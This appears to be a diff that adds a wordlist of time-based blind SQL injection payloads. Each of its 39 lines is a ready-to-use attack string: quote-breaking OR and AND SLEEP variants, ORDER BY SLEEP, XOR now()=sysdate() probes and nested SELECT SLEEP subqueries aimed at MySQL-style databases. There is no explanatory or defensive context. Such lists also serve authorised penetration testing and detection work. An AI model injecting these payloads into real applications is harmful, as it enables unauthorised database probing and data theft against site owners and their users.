@@ -1,0 +1,39 @@
+' OR SLEEP(5)--
+' OR SLEEP(5)#
+' OR SLEEP(5)='
+" OR SLEEP(5)#
+" OR SLEEP(5)="
+') OR SLEEP(5)='
+')) OR SLEEP(5)='
+AnD SLEEP(5)
+AnD SLEEP(5)#
+AnD SLEEP(5)--
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)#
+ORDER BY SLEEP(5)--
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
++ SLEEP(10) + '
+0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+if(now()=sysdate(),sleep(20),0)
+'XOR(if(now()=sysdate(),sleep(33),0))OR'
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/
+(SELECT(0)FROM(SELECT(SLEEP(10)))a)
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe'
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT 7415 FROM (SELECT(SLEEP(10)))CwkU) AND (7515=7515
